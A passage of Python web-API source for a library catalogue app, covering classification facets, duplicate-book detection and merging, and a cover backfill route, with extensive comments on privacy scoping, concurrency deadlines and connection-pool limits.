    The source for the classification filter panel, and the counterpart of
    `/tags` and `/locations`. Ordered here so the response is deterministic:
    headings by scheme then number, divisions by number, both ascending, which
    for Dewey is shelf order and for a subject vocabulary is at least stable.
    The order a reader sees is the client's, as it is for tags.

    **The counting is the shelf's**, and this handler deliberately holds none of
    it. A row in `classifications` carries no member, so nothing about it says
    who may see it, and a facet list built here with a bare query would publish
    the subject headings of other people's private reading without returning a
    single Book. `Shelf.classification_facets` applies the viewer's predicate by
    construction, and `tests/test_shelf.py` names this exact disclosure as the
    reason its fourth pass exists.
    """
    headings, divisions = Shelf.seen_by(db, current_user.id).classification_facets()
    return ClassificationFacets(
        headings=sorted(
            (
                HeadingFacetOut(
                    scheme=row.scheme,
                    number=row.number,
                    label=row.label,
                    kind=row.kind,
                    book_count=row.book_count,
                )
                for row in headings
            ),
            key=lambda facet: (facet.scheme, facet.number),
        ),
        divisions=sorted(
            (
                DivisionFacetOut(
                    division=row.division,
                    # This library's own word, not Dewey's caption. The schema
                    # field says why at length.
                    label=ddc.DIVISION_TAGS.get(row.division),
                    book_count=row.book_count,
                )
                for row in divisions
            ),
            key=lambda facet: facet.division,
        ),
    )


# ── Duplicates and merging ────────────────────────────────────────────────────
#
# "Is this the same **book**", which is a different question from "is this the
# same **person**" above: these share `authors.author_key` as a normalisation
# and nothing else, and nothing here reads or writes `author_aliases`. They sat
# under the Authors header until the author logic moved to `authorship.py` and
# left the header describing 361 lines it no longer covered.


class _DuplicateRow(NamedTuple):
    """One catalogue row as this route reads it, and the whole of what it reads.

    Four columns for the grouping (`id`, `title`, `author`, `copy_group`) and
    five more for the card. Nothing here is an ORM `Book`, and that is the
    point rather than tidiness: once no entity survives the scan, no attribute
    read downstream can lazily load a relationship and quietly re-widen the
    query into the per book N+1 this route has already paid for once.
    """

    id: int
    title: str
    author: str | None
    copy_group: str | None
    format: BookFormat | None
    publisher: str | None
    year: int | None
    isbn: str | None
    cover_url: str | None


@router.get("/duplicates", response_model=DuplicateReport)
def list_duplicates(db: DbSession, current_user: CurrentUser) -> DuplicateReport:
    """Books that look like the same work under different ids.

    Matched on normalised title plus author, NOT on ISBN. An accidental exact
    repeat is already refused by `uq_books_isbn_single_copy`, so the case left
    to catch is the one it cannot see: a hardback and a paperback are the same
    book and two legitimately different ISBNs.

    **A deliberate copy is not a duplicate, and this is where the two are told
    apart.** Two paperbacks of one title are two rows sharing a `copy_group`
    and would otherwise be the strongest match this endpoint can produce: same
    title, same author, same everything. Offering them for merge would invite
    somebody to destroy a book they own, so each group is collapsed to one row
    before the grouping runs. What survives is what the collapse could not
    explain, which is exactly the accidental case.

    Grouping happens in Python rather than SQL because the normalisation
    (casefold, strip punctuation, drop a leading article) is not something
    SQLite can express, and the catalogue is small enough that scanning it is
    cheaper than maintaining a normalised column.

    **The scan is unpaginated and the answer is capped, which are two
    different statements.** Every request reads one row per visible Book,
    because a page of the catalogue cannot be grouped on its own: a pair split
    across two pages is two singletons. What the cap cuts is the finished
    grouping, never the population it ran over, so a group is never split by
    it and the answer never depends on a grouping computed in an earlier
    request. The work is unbounded; the answer is not.
    """
    # One statement over `books`, whatever the shelf holds, pinned by
    # `test_books_duplicates.py::TestTheScanCostsOneStatement`. The route used
    # to hydrate the whole visible shelf and then put every duplicate in it
    # through `books_to_out`, for a row the card reads seven fields of.
    #
    # What that cost is deliberately not repeated here: it is stated once, in
    # `books_to_out`, where a test reads it back out of the docstring and
    # measures against it. This comment used to carry its own copy of that
    # figure and it went stale with nothing failing anywhere.
    #
    # `Shelf.select` rather than a bare query, and not as a formality: it
    # rebuilds from `seen_by`'s own criteria tuple, so this projection and the
    # entity read it replaced are narrowed by the same object and cannot
    # diverge. `importing.MarcIndex.build` scans on the same predicate the
    # same way.
    rows = [
        _DuplicateRow(*row)
        for row in cast(
            "list[tuple[int, str, str | None, str | None, BookFormat | None, "
            "str | None, int | None, str | None, str | None]]",
            Shelf.seen_by(db, current_user.id)
            .select(
                Book.id,
                Book.title,
                Book.author,
                Book.copy_group,
                Book.format,
                Book.publisher,
                Book.year,
                Book.isbn,
                Book.cover_url,
            )
            .tuples()
            .all(),
        )
    ]

    groups: dict[str, list[_DuplicateRow]] = {}
    for row in _one_per_copy_group(rows):
        groups.setdefault(_duplicate_key(row), []).append(row)

    # **`len(members) > 1` counts visible rows and is the whole privacy rule of
    # this feature.** `key` is readable plaintext of the title and the author,
    # so a group standing on one visible row plus a sibling the viewer cannot
    # see would publish that sibling's title. Nothing the viewer cannot see is
    # in `rows` at all, so such a group cannot arise here; `DuplicateGroup`
    # refuses to be constructed with one if it ever does.
    duplicated = sorted(
        (key, members) for key, members in groups.items() if len(members) > 1
    )

    shown: list[DuplicateGroup] = []
    remaining = DUPLICATE_BOOKS_SHOWN
    for key, members in duplicated:
        # Whole groups only. The merge action sends every id the card renders,
        # so a group cut by the budget would be a merge offered over a subset
        # nobody chose. A group contributes at most `MERGE_BOOKS_MAX`, which is
        # below the budget, so the first group always fits and the answer can
        # stop below the budget but never above it.
        members_shown = members[:MERGE_BOOKS_MAX]
        if len(members_shown) > remaining:
            break
        remaining -= len(members_shown)
        shown.append(
            DuplicateGroup(
                key=key,
                size=len(members),
                books=[_duplicate_member(row) for row in members_shown],
            )
        )

    return DuplicateReport(groups=shown, total_groups=len(duplicated))


def _duplicate_member(row: _DuplicateRow) -> DuplicateMember:
    """The card's view of one row. `author` and `copy_group` stay behind.

    The author is the half of the key the group already carries, and the copy
    group token is a fact about another member's copies.
    """
    return DuplicateMember(
        id=row.id,
        title=row.title,
        format=row.format,
        publisher=row.publisher,
        year=row.year,
        isbn=row.isbn,
        cover_url=row.cover_url,
    )


def _one_per_copy_group(rows: list[_DuplicateRow]) -> list[_DuplicateRow]:
    """One row per set of deliberate copies, and every ungrouped row as it is.

    The representative is the lowest id in the group, which is stable between
    two reads of the same shelf. Nothing else depends on which one it is: a
    group that survives the collapse alone is dropped from the result, and a
    group that lands beside a genuine duplicate is being offered as a book, not
    as a copy.

    The id order it leaves behind is also the order the member cap cuts at, so
    which members a group over the cap shows is stable between two reads.
    """
    seen: set[str] = set()
    kept: list[_DuplicateRow] = []
    for row in sorted(rows, key=lambda candidate: candidate.id):
        if row.copy_group is not None:
            if row.copy_group in seen:
                continue
            seen.add(row.copy_group)
        kept.append(row)
    return kept


def _duplicate_key(row: _DuplicateRow) -> str:
    """Normalise a book to something two editions of it will share.

    `identity.work_key` is the implementation, and it is there rather than here
    because the MARC importer matches on the same predicate: a wrong answer
    costs a reading status on the wrong edition at the loosest site and merges
    two different books at this one, so which sites share a predicate is that
    module's subject rather than this route's.
    """
    return identity.work_key(row.title, row.author)


@router.post("/merge", response_model=BookOut)
def merge_books(
    payload: MergeRequest,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Fold several catalogue entries into one.

    The survivor absorbs anything the others have and it lacks: a cover, an
    ISBN, a page count. It never overwrites a value it already holds, on the
    same principle as enrichment, since the kept row is the one a person chose.

    Tags, notes, quotes, loans and reading statuses are repointed rather than
    dropped. A status collision (both rows read by the same person) keeps the
    one on the survivor, because deleting somebody's reading history to
    satisfy a unique index is not an acceptable way to resolve it.
    """
    if payload.keep_id not in payload.book_ids:
        raise HTTPException(status_code=400, detail="keep_id must be one of book_ids")

    books = Shelf.seen_by(db, current_user.id).where(Book.id.in_(payload.book_ids)).all()
    found = {book.id: book for book in books}
    if payload.keep_id not in found:
        raise HTTPException(status_code=404, detail="Book not found")
    if len(found) < 2:
        raise HTTPException(status_code=400, detail="Nothing to merge into that book")

    keeper = found[payload.keep_id]
    losers = [book for book in books if book.id != keeper.id]

    # No further permission check: `visible_to` already yields exactly the set
    # this caller may write. Public books are a shared shelf, and a private
    # book is only visible to the member who added it, so anything that came
    # back from that filter is theirs to merge. See dependencies.book_for_write.

    # Absorbing the columns and moving every child row is `folding.fold`, which
    # is also where the flushes and the ISBN release ordering live. What stays
    # here is this transaction's own business: the covers on disk, the copy
    # group tokens, and when the commit happens.
    folding.fold(db, keeper, losers)

    # Read before the loop: `db.expire(loser)` below would make each of these
    # a fresh SELECT, and after the delete there is nothing left to read them
    # from at all.
    shrinking_groups = {loser.copy_group for loser in losers} - {None}

    orphaned_covers: list[int] = []
    adoptions: list[int] = []
    for loser in losers:
        # The keeper may have absorbed the loser's `cover_url`, which names a
        # file about to be deleted with it. Moving the file is what keeps that
        # cover working; everything else the loser held is dead bytes.
        #
        # Decided here, performed after the commit. The URL has to be known now
        # because it goes into the row, and `covers.adoption_url` answers that
        # from the source file's extension without moving anything. Doing the
        # move here as well would put a filesystem write no rollback undoes
        # inside the transaction: a raise between this loop and the commit,
        # which `_normalise_copy_group`'s flush makes reachable, would leave the
        # keeper's row naming a file that had already moved somewhere else.
        if keeper.cover_url == covers.local_url_for(loser.id):
            planned = covers.adoption_url(keeper.id, loser.id)
            keeper.cover_url = planned
            if planned is not None:
                adoptions.append(loser.id)
        orphaned_covers.append(loser.id)

        # Expire before deleting. The repointing above moved rows out from
        # under the loser, but its loaded relationship collections still list
        # them, and the delete cascade walks those collections rather than the
        # database. Without this, every note, quote, loan and status just
        # moved to the keeper is deleted along with the row they came from.
        db.expire(loser)
        db.delete(loser)

    # Merging two rows that were copies of each other is a member saying they
    # were never two objects. That can leave one row wearing a group token,
    # which would keep its ISBN out of the unique index for no reason. Flushed
    # first, or the rows being counted still include the ones just deleted.
    if shrinking_groups:
        db.flush()
        for token in shrinking_groups:
            _normalise_copy_group(token, db)

    db.commit()
    # After the commit, for the reason in `_purge`: a file **moved or unlinked**
    # before it is a loss no rollback undoes. Writing a new one is the other way
    # round on purpose, everywhere in this module; see docs/decisions.md.
    #
    # Adoptions first, and **their outcome decides the sweep**. `adopt` answers
    # None when the move failed, and `cover_store.move` is atomic and
    # re-raises having removed only its own temporary file, so on that answer
    # the loser's cover is still sitting under the loser's id. Sweeping it
    # anyway destroys the only copy there is, which for a hand-uploaded cover
    # means destroying it for good: there is no remote source, so the backfill
    # has nothing to re-fetch and cannot repair it.
    kept = {
        from_book_id
        for from_book_id in adoptions
        if covers.adopt(keeper.id, from_book_id) is None
    }
    for book_id in orphaned_covers:
        if book_id not in kept:
            cover_store.remove(book_id)

    # The row promised a cover the move did not produce, so it is corrected
    # rather than left naming a file nobody wrote. This is what the old
    # pre-commit ordering did with `adopted if adopted else None`, and losing it
    # was the one thing deferring the move made worse rather than better.
    if kept:
        keeper.cover_url = None
        db.commit()

    db.refresh(keeper)
    return book_to_out(keeper, current_user, db)


# ── Covers ────────────────────────────────────────────────────────────────────

#: Books one backfill run repairs.
#:
#: **Bounded because it holds an HTTP request open while it fetches**, and it is
#: what a press examines at most rather than what a run costs:
#: `COVER_BACKFILL_DEADLINE_SECONDS` bounds the run's life whatever the hundred is.
#: The response says how many are left, and the caller presses again.
MAX_BACKFILL_BOOKS: Final = 100

#: Wall clock one book of a backfill run may spend.
#:
#: **Twelve, two hops of `covers.TIMEOUT_SECONDS`.** One cover book is a candidate
#: check and then a download, each of which may walk up to `covers.MAX_REDIRECTS`
#: further hops, and with no budget every one of those hops gets the full
#: `covers.TIMEOUT_SECONDS`: `covers.resolve_and_store` records what that bounds
#: and what it does not. Passing this is what makes a book's cost a number, and so
#: what makes a wave's.
#:
#: **A book that runs out of budget is not lost and is not skipped.** Past it the
#: best candidate is kept unverified, so the row carries the remote URL and the run
#: counts the book `unreachable`; no file lands behind its id, so it is a candidate
#: again on the next pass through the library. That is the trade
#: `covers.INTERACTIVE_BUDGET_SECONDS` makes on the add path, for a caller who is
#: waiting on one book rather than on a run of them.
#:
#: **Not that constant's four.** Four is sized against a person watching one book
#: being added, and Open Library answers every cover with a chain of three hops
#: (`covers.COVER_HOSTS` measured it), so four here would report `unreachable` for
#: covers that are merely behind two redirects.
#:
#: **Retuning `covers.TIMEOUT_SECONDS` means retuning this.** A budget that is not
#: whole hops of it buys a fraction of a hop nothing can spend, `_hop_seconds`
#: giving a hop the smaller of that timeout and what is left, so
#: `test_a_books_budget_is_whole_hops` goes red on the hop timeout moving and the
#: edit it is asking for is here rather than there.
COVER_BACKFILL_BUDGET_SECONDS: Final = 12

#: How long one backfill run may spend waiting for fetch slots.
#:
#: **Twenty four, and this route's first deadline of any kind.** Without one a run
#: was bounded only by the batch: `ceil(MAX_BACKFILL_BOOKS /
#: covers.MAX_CONCURRENT_FETCHES)` waves, 17, of whatever one book cost, which with
#: nothing bounding a book was the figure `covers.INTERACTIVE_BUDGET_SECONDS`
#: derives for an unbudgeted walk and put a run near 400s. At
#: `ratelimit.COVER_BACKFILL_LIMIT`'s 0.1 presses a second that is **41 runs in
#: flight from one member**, each holding a connection and six fetch slots, which
#: is what this constant and `covers.FETCHES_AT_ONCE` close between them.
#:
#: * **The hold.** `get_current_user` checks a connection out before this runs and
#:   `get_db` returns it only after the response, so a run holds one for its whole
#:   life: this plus one `COVER_BACKFILL_BUDGET_SECONDS`, because the check before a
#:   wave is `left(ends) <= 0`, so a wave admitted just under 24 runs a full book
#:   after it. `0.1 x 36s` is **3.6 runs in flight**, against 41.
#:
#:   **One budget and not one per book of the wave, and what makes that true is
#:   where the wave's cancels sit.** The handler cancels every unstarted
#:   submission of a wave before it reads any of them; interleaved, a worker freed
#:   during one read starts the next offset and the wave drains serially for a
#:   budget a book, measured at 0.919s against a claimed 0.400s. The comment at
#:   that loop carries the measurement, and this figure is only the hold while the
#:   ordering there holds.
#: * **The sibling's hold is the ceiling, not a number repeated here.**
#:   `IDENTIFIER_BACKFILL_DEADLINE_SECONDS` argues its own hold down to a share of
#:   the pool and states the pool's size; this route's arrival rate is the same, so
#:   the comparison is between the two holds and
#:   `TestTheDeadlineIsDerivedRatherThanChosen` asserts it rather than copying the
#:   figure a third time.
#: * **The wave.** Two whole `COVER_BACKFILL_BUDGET_SECONDS`, so where every book
#:   spends its whole budget a cut lands where a wave would have ended rather than
#:   mid wave.
#:
#: **It does not make this route safe for the pool**, for the reason the sibling
#: constant states in full: the limiter keys on a username and under
#: `AUTH_MODE=proxy` a username is free, so no arrival rate bounds the adversarial
#: case. It moves one member's hold and removes no class.
#:
#: **This figure exists because the fan out runs inside the request.** Move it to a
#: background job and this is deleted rather than retuned, while
#: `covers.FETCHES_AT_ONCE`, the per book budget and the cursor all survive
#: unchanged.
COVER_BACKFILL_DEADLINE_SECONDS: Final = 24

#: The three outcomes `CoverBackfillOut` counts, as the run's own walk labels one
#: book.
#:
#: A `Literal` for `_Bucket`'s reason, which that alias states: the counts are taken
#: with `list.count`, so a typo in one of the three reports 0 for that outcome while
#: `examined`, which is the length of the run rather than their sum, stays right.
#: Nothing on the wire would say so. Against this alias mypy refuses the typo.
_Cover = Literal["stored", "unreachable", "still_missing"]


@router.post("/covers/backfill", response_model=CoverBackfillOut)
def backfill_covers(
    db: DbSession,
    current_user: CurrentUser,
    after_id: Annotated[
        int,
        Query(
            ge=0,
            # Bounded above as well as below, and the upper bound is not
            # decoration. A Python int has no ceiling and SQLite's does, so
            # without this a bigint passes validation, reaches the driver and
            # raises `OverflowError` from inside the query: a 500 out of the
            # unhandled-exception handler, which classes a bad request as a bug
            # in our own code. Every other numeric query parameter here is
            # bounded at both ends for the same reason.
            le=2**63 - 1,
            description="Carry on past this book id. From the previous reply.",
        ),
    ] = 0,
) -> CoverBackfillOut:
    """Fetch and store the covers of books that are missing one.

    This is what repairs a library that already exists. Storing covers on the
    way in only helps books added afterwards, and the books that need it most
    are the thousands that arrived through a CSV import, which never resolved a
    cover at all.

    **Scoped to the books the caller can see**, like every other query here. An
    admin-only backfill would be worse, not better: `visible_to` has no admin
    bypass, so an admin running it could never repair another member's private
    books, and those books would have no way to be repaired at all. Each member
    repairs their own shelf instead, and the privacy rule is not bent to make an
    operator action work.

    Targets every book with **no cover file behind its id**, which is the set
    that needs one: a book that never had a cover, a book whose `cover_url`
    points at a third party (that is what rots, a file on this volume is not),
    and a book whose column claims a local cover the directory does not have.
    The last case is why this reads the directory rather than the column: they
    can drift, files being the one thing a database row does not carry with it.

    **`after_id` is a cursor, and it is what lets this finish.** Without it the
    batch is the first hundred candidates by id, and a book that cannot be fixed
    stays a candidate, so it sits at the front of every subsequent run for ever.
    Measured across ten ISBNs, only eight resolved to an image, so roughly a
    fifth of any batch is permanently unfixable and accumulates; a pod with no
    egress produces the same shape on the first run. With the cursor each run
    starts past what the last one tried, and `next_after_id` comes back as 0
    once the end is reached, so pressing again starts over and re-tries the ones
    that failed, which may since have become fixable.

    **Bounded in wall clock as well as in books**, so a slow or blackholing image
    service leaves the batch short rather than holding the request open. A short
    run answers with whatever resolved, counts only the books it has an outcome
    for, and moves the cursor over exactly those, so pressing again resumes at the
    first book this one did not reach. The reply does not distinguish a short run
    from a complete one and does not need to: press again while `remaining` is
    above zero.

    **Each book is bounded too.** A cover is a candidate check and then a
    download, each of which may follow redirects, and with no budget every hop of
    both got a timeout of its own, so one unlucky book could spend what the whole
    run was meant to. Past its budget a book keeps the remote URL, is counted
    `unreachable`, and is a candidate again on the next pass through the library.

    Idempotent either way: a book with a file behind it is never a candidate, so
    a second pass over the same range examines nothing it fixed.
    """
    cover_backfill_limiter.check(current_user.username)

    # One directory read for the whole library, rather than a `stat` per book.
    # A book "has a cover here" when there is a file behind its id, not when its
    # `cover_url` says so: trusting the column is what would let the database
    # and the directory drift apart quietly, and it is also what would stop this
    # being safe to run twice.
    on_disk = cover_store.book_ids()
    catalogue = (
        Shelf.seen_by(db, current_user.id).where(Book.id > after_id).all(Book.id.asc())
    )
    candidates = [book for book in catalogue if book.id not in on_disk]
    batch = candidates[:MAX_BACKFILL_BOOKS]

    ends = deadline.in_(COVER_BACKFILL_DEADLINE_SECONDS)

    def record(book: Book, url: str | None) -> _Cover:
        """Fold one answer into its Book, and name the outcome it counts as."""
        if url is None:
            return "still_missing"
        # **The guard is not about the UPDATE, which the unit of work already
        # elides**: an assignment of an equal value emits no statement and this
        # table has no `onupdate`, measured with a cursor listener. What it keeps
        # out is `Book._store_covers_over_https`, which **drops** a value it finds
        # unrenderable rather than passing it through. `resolve_and_store` answers
        # with `supplied` when the download fails, so an unrenderable URL that
        # `backup.restore` wrote through Core, where `@validates` does not fire,
        # comes back here equal to the column: assigning it would null the only
        # cover that row has and log a warning, on a run that repaired nothing.
        # `test_a_run_that_re_resolves_an_unrenderable_stored_cover_keeps_it` fails
        # if this goes.
        if url != book.cover_url:
            book.cover_url = url
        if covers.is_local(url):
            return "stored"
        # Resolved to a remote URL this server could not download. Counted
        # separately from "no image service has one": with no egress every book
        # lands here, and folding it into either of the other two would report a
        # clean no-op in exactly the situation this exists for.
        return "unreachable"

    # One outcome per book of the batch, in batch order, `None` where this run
    # learned nothing about it: no slot came free inside the deadline, or the
    # deadline cut before its wave was submitted.
    outcomes: list[_Cover | None] = [None] * len(batch)
    cut_short = False

    # **Waves of `covers.MAX_CONCURRENT_FETCHES`, the deadline checked between
    # them, rather than one `pool.map` over the batch.** Concurrent either way,
    # because serial is one round trip per book and a thousand books at even half
    # a second each is eight minutes of waiting. Three reasons for the waves, and
    # the first changes an answer rather than a cost.
    #
    # * `next_after_id` has to be the end of the **contiguous** examined run, and
    #   submitting in batch order a wave at a time is what makes the examined set
    #   a prefix by construction. `pool.map` has the ordering but not the cut: it
    #   cannot be stopped at a wall clock without abandoning the iterator, and an
    #   abandoned fetch still writes its file, which takes the book out of the
    #   candidate set with its row left pointing at whatever it pointed at before.
    # * A submission is queued, not run, so submitting the whole batch at once
    #   puts a second member's first wave behind a hundred of somebody else's
    #   fetches. A wave never leaves more than `covers.MAX_CONCURRENT_FETCHES`
    #   queued, so the pool's own order is a queue of waves rather than of runs.
    # * It is what puts a cut on a wave boundary, which is the third of
    #   `COVER_BACKFILL_DEADLINE_SECONDS`' derivations.
    #
    # The cost, stated rather than left to be discovered: a wave's wall clock is
    # its slowest book, so idle slots appear where one `map` would have kept six
    # in flight.
    at = 0
    while at < len(batch):
        if deadline.left(ends) <= 0:
            cut_short = True
            break
        # **Every column is read here, in this thread, and never in the pool.**
        # The Session is not thread safe, and a lazy load or a refresh fired from
        # a worker is a read on this handler's session from another thread. The
        # comment this replaces claimed only the fetch ran in the pool while the
        # `lambda` it sat on read three columns there.
        asked: list[tuple[int, Book, Future[str | None]]] = []
        while at < len(batch) and len(asked) < covers.MAX_CONCURRENT_FETCHES:
            book = batch[at]
            asked.append(
                (
                    at,
                    book,
                    covers.FETCHES_AT_ONCE.submit(
                        covers.resolve_and_store,
                        book.id,
                        book.isbn,
                        book.cover_url,
                        budget=COVER_BACKFILL_BUDGET_SECONDS,
                    ),
                )
            )
            at += 1

        # **The deadline is spent on the slot and nowhere else**, and the two
        # spellings a reader reaches for first are both worse.
        #
        # A deadline on the **request** loses the answers already in hand: the
        # fetches that finished have written their files, so abandoning their
        # results leaves a cover behind a book id with the row still naming the
        # remote URL it could not download, and nothing makes that book a
        # candidate again to repair it.
        #
        # Cancelling a fetch in flight cannot be done at all: a thread running
        # `covers.resolve_and_store` is not interruptible, and the file it is part
        # way through writing is `cover_store`'s to finish. So what this waits on
        # is only the part that is still a **queue position**, and
        # `Future.cancel` is what distinguishes the two: true for a submission
        # that never started, false for one that is running or done, which is then
        # read for its answer and counted.
        #
        # **The wait is therefore not a bound on the wave.** A wave that has
        # started runs to `COVER_BACKFILL_BUDGET_SECONDS`, which is the second term
        # in the hold that constant's own comment derives.
        wait([fetching for _, _, fetching in asked], timeout=max(deadline.left(ends), 0.0))

        # **Every cancel before any read, and that ordering is the hold.** A read
        # blocks for up to `COVER_BACKFILL_BUDGET_SECONDS` and this pool is process
        # wide, so with the two interleaved a worker freed during the read of one
        # offset dequeues the next one and **starts** it: its `cancel` then answers
        # False, it is waited for from its own start, and the wave drains serially
        # for one budget a book. Measured on a one slot stand-in, three books, a
        # 0.1s deadline and a 0.3s fetch: **0.919s held against the 0.400s the
        # deadline claims, the whole wave examined and the run not reporting a cut**,
        # which at the shipped figures is `24 + 6 x 12` rather than `24 + 12`.
        # Cancelling first makes every future still read one that had started at or
        # before the cut, which is what `COVER_BACKFILL_DEADLINE_SECONDS`' hold is
        # derived from, and it leaves nothing queued behind a read that raises.
        started = [
            (offset, book, fetching)
            for offset, book, fetching in asked
            if not fetching.cancel()
        ]
        if len(started) != len(asked):
            # A submission that never started is a book this run never examined,
            # and so is everything after it.
            cut_short = True
        for offset, book, fetching in started:
            outcomes[offset] = record(book, fetching.result())
        if cut_short:
            break

    db.commit()

    # The unbroken examined run, which is the only thing the cursor may clear.
    #
    # **A book past the cut whose fetch did answer is still stored**, because the
    # bytes are already on this volume: the row is updated and committed above,
    # which is what keeps the column and the directory agreeing. It is counted in
    # no outcome, so the reply understates what this run did and never overstates
    # it, and that book is not a candidate for the next press.
    cleared = outcomes[
        : next(
            (offset for offset, outcome in enumerate(outcomes) if outcome is None),
            len(outcomes),
        )
    ]
    examined = len(cleared)
    stored = cleared.count("stored")
    unreachable = cleared.count("unreachable")
    still_missing = cleared.count("still_missing")
    remaining = len(candidates) - examined
    logger.info(
        "Cover backfill for %s: examined %d of %d, stored %d, unreachable %d, "
        "none found for %d, %d left%s. Totals: %s",
        current_user.username,
        examined,
        len(batch),
        stored,
        unreachable,
        still_missing,
        remaining,
        ", cut short by the deadline" if cut_short else "",
        covers.outcome_counts(),
    )
    return CoverBackfillOut(
        examined=examined,
        stored=stored,
        unreachable=unreachable,
        still_missing=still_missing,
        remaining=remaining,
        # **The last book of the unbroken examined run, never the last book of the
        # batch**, which would skip every book a cut dropped for a whole pass of
        # the library. Where the run examined none of them it is `after_id`
        # unchanged, so the next press resumes where this one stood. 0 at the end,
        # so the next press starts over rather than answering nothing for ever,
        # and a cut can never report the end: a cut means at least one book of the
        # batch has no outcome, so `examined <= len(batch) - 1` and `remaining` is
        # at least 1.
        next_after_id=(
            (batch[examined - 1].id if examined else after_id) if remaining > 0 else 0
        ),
    )


# ── Store identifiers ─────────────────────────────────────────────────────────

#: Books one identifier backfill run resolves.
#:
#: **Bounded because it holds an HTTP request open while it fetches**, which is
#: `MAX_BACKFILL_BOOKS`' reason, and sized against the same thing: a reverse
#: proxy's read timeout, which for the deployments this ships to is a minute.
#: `IDENTIFIER_BACKFILL_CONCURRENCY` in flight over fifty books is
#: `ceil(50 / 6)` waves, nine, and one request is bounded by
#: `fetch.TIMEOUT_SECONDS`, so this constant alone would put the worst case at
#: **90s**.
#:
#: **It no longer does, and this figure is no longer what keeps the route inside
#: the minute.** `IDENTIFIER_BACKFILL_DEADLINE_SECONDS` bounds the run's life at
#: 40s whatever the fifty is, so the arithmetic above is now what the fifty would
#: cost unbounded rather than what a run costs. The fifty survives as what a
#: press examines at most, which is the presses a member pays, and the paragraph
#: below is the number to argue with.
#:
#: **Deliberately not compared with the cover backfill's hundred**, and an
#: earlier version of this paragraph was: "six at a time against a six second
#: timeout, so a hundred books is at worst 100s". That figure does not exist. One
#: cover book is up to three candidate checks plus a download rather than one
#: request, which is why that route's per book ceiling is its own constant,
#: `COVER_BACKFILL_BUDGET_SECONDS`, rather than a request's timeout. The two routes
#: differ in the work per book, not in the timeout, so the hundred is not evidence
#: about this fifty.
#:
#: **What it costs a member is presses**, and that is the number to argue with:
#: a 900 book Play Books import is 18 of them. The response says how many are
#: left and the screen says so.
MAX_IDENTIFIER_BACKFILL: Final = 50

#: Volume lookups in flight at once during a backfill.
#:
#: **Six, derived here rather than borrowed.** A backfill runs over a whole
#: library, so an unbounded gather would open a socket per book and get this
#: deployment's address refused. The binding reason is memory:
#: `fetch.MAX_RESPONSE_BYTES` prices the pod at sixteen concurrent 2 MiB
#: responses, and `metadata.search` already spends eight of them, so a backfill
#: that ran ten at a time could put a search over the ceiling that constant
#: computes.
#:
#: **`covers.MAX_CONCURRENT_FETCHES` is also six and that is not evidence**, on
#: the ground `MAX_IDENTIFIER_BACKFILL` states four lines above: that route is
#: bounded by what two image services will tolerate, and this one by a metered
#: key's bill. Either may move without the other.
IDENTIFIER_BACKFILL_CONCURRENCY: Final = 6

#: The pod's slots for a backfill's outbound volume requests, held once for the
#: process rather than once per request.
#:
#: **Built here rather than in the handler body, which is the defect this
#: replaces.** The ceiling it defends belongs to the pod:
#: `fetch.MAX_RESPONSE_BYTES` prices sixteen concurrent responses and
#: `metadata.search` spends eight of them **per fan out, not per pod**: the
#: default path admits four fan outs per member, `ratelimit.METADATA_LIMIT`'s 60 a
#: minute over `metadata.SEARCH_DEADLINE_SECONDS`' 4.0s, so 32 responses can be
#: live on that path alone. So this bound leaves room for one fan out and **does
#: not keep the pod under the sixteen**, which is the search path's own question
#: and has its own ticket. A semaphore built per call
#: bounds one call and enforces nothing about the pod, so nine runs of six
#: inside this route's own rate limit put 54 sockets, and **54, plus a search's
#: eight**, at that constant's own retention figure is about 1.99 GB of parse
#: against a pod `fetch.py` records being OOMKilled at 1.8 GB once already.
#: **The eight is load bearing and was left out of that sentence once**: 54 alone
#: is 1.73 GB, which is under the 1.8, so what carries the conclusion is the
#: sockets a search is already holding rather than this route's own. `metadata._HARDER_AT_ONCE` is the
#: same placement for the same reason and states the pool's fifteen this does
#: not restate.
#:
#: **Process wide is pod wide only because the pod runs one process.** The image
#: gives uvicorn no `--workers`, so under one this is the pod's bound and under
#: `--workers N` it becomes per worker and the sixteen is exceeded N-fold with
#: nothing going red. No test in this tree can read a `CMD` line.
#:
#: **Waited on, where `_HARDER_AT_ONCE` refuses to wait, and the difference is
#: the caller rather than the resource.** A search that loses its slot runs the
#: ordinary search and says which catalogues it asked, so a refusal there is a
#: true answer; a backfill has nothing cheaper to do, so a refusal is a retry
#: and no rows. `IDENTIFIER_BACKFILL_DEADLINE_SECONDS` is what buys the wait.
#:
#: **What a process wide bound admits, said here because a later reader will
#: assume it absent**: occupancy is observable across members, since a member
#: can read somebody else's activity off their own batch's shortfall. Six slots
#: busy, and not a title, an identifier or whose books; every public book is
#: already a candidate for everyone, so nothing is paid to close it.
_BACKFILL_LOOKUPS_AT_ONCE: Final = asyncio.Semaphore(IDENTIFIER_BACKFILL_CONCURRENCY)

#: How long one backfill run may spend waiting for slots and for answers.
#:
#: **Thirty, and three independent derivations land on it**, which is the reason
#: to prefer it to 25 or 35.
#:
#: * **The pool.** `get_current_user` checks a connection out before this runs
#:   and `get_db` returns it only after the response, so a run holds one for its
#:   whole life. **Little's law takes the hold, not this constant**, and the hold
#:   is this plus one `fetch.TIMEOUT_SECONDS`: waves are sequential and the check
#:   before each one is `left(ends) <= 0`, so an acquire admitted just under 30
#:   runs a full request after it, which `fetch.get` bounds with no retry on the
#:   path. This route's limiter allows six presses a minute, so `0.1/s x 40s` is
#:   **4 of the pool's fifteen per member**, against the 9 the route held when its
#:   worst case was 90s, which is that same quantity over that life.
#: * **The wave.** It is exactly three times `fetch.TIMEOUT_SECONDS`, so in the
#:   every-request-times-out case a cut lands where a wave would have ended
#:   anyway rather than mid wave, which is what the loop below needs.
#: * **The proxy.** Half the 60s read timeout measured on the proxy in front of
#:   this, which leaves the two queries and the commit real margin. That figure
#:   is deliberately not given a name here: it is a dependency default nobody in
#:   this deployment set, and a named constant would read as this repository's.
#:
#: **It does not make this route safe for the pool**, and a comment saying it
#: did would be the thing that stopped anybody finishing the job. It moves the
#: hold from 9 of fifteen to 4 and removes no class: the limiter keys on a
#: username, and under `AUTH_MODE=proxy` a username is free, so no arrival rate
#: bounds the adversarial case. The class goes only by not holding the session
#: across the fan out, which is larger than one sitting.
#:
#: **Not sized against `QueuePool`'s 30.0s `pool_timeout`, which is the
#: comparison the next reader reaches for**, because the honest handler bound is
#: this plus `fetch.TIMEOUT_SECONDS`, 40s, and that is longer. `pool_timeout` is
#: a waiter's patience once the pool is empty, not a permitted hold: at 4 of
